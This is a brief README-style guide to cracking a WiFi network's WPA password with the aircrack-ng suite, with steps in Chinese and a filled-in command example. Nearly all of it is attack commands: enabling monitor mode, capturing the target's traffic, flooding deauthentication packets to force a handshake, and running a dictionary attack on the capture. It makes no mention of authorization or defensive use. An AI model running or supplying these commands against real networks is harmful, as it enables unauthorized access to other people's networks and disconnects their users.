# Aircrack-ng-Guide
A sample use guide for aircrack-ng in linux

### Step
1. 查看网卡列表: iwconfig
2. 启用用来破解的网卡: airmon-ng start <网卡名>
3. 重新查看网卡列表，指定网卡启用后网卡名会变: iwconfig
4. 查看 wifi 列表: airodump-ng <网卡名>
5. 抓取目标 wifi 的网络包并存储: airodump-ng -c <channel> --bssid <wifi 破解目标的bssid> -w <文件名> <网卡名>
6. 获取握手包，直到出现 WPA handshake: aireplay-ng -0 0 -a <bssid> <网卡名>
7. 利用字典破解 .cap 数据包: aircrack-ng -w <字典名> -b <bssid> 文件名*.cap

### Example
<pre><code>iwconfig
airmon-ng start wlp0s20u1
iwconfig
airodump-ng wlp0s20u1mon
airodump-ng -c 6 --bssid C0:61:18:29:9D:28 -w wifiname wlp0s20u1mon
aireplay-ng -0 0 -a C0:61:18:29:9D:28 wlp0s20u1mon
aircrack-ng -w wordlist.txt -b C0:61:18:29:9D:28 wifiname*.cap
</code></pre>
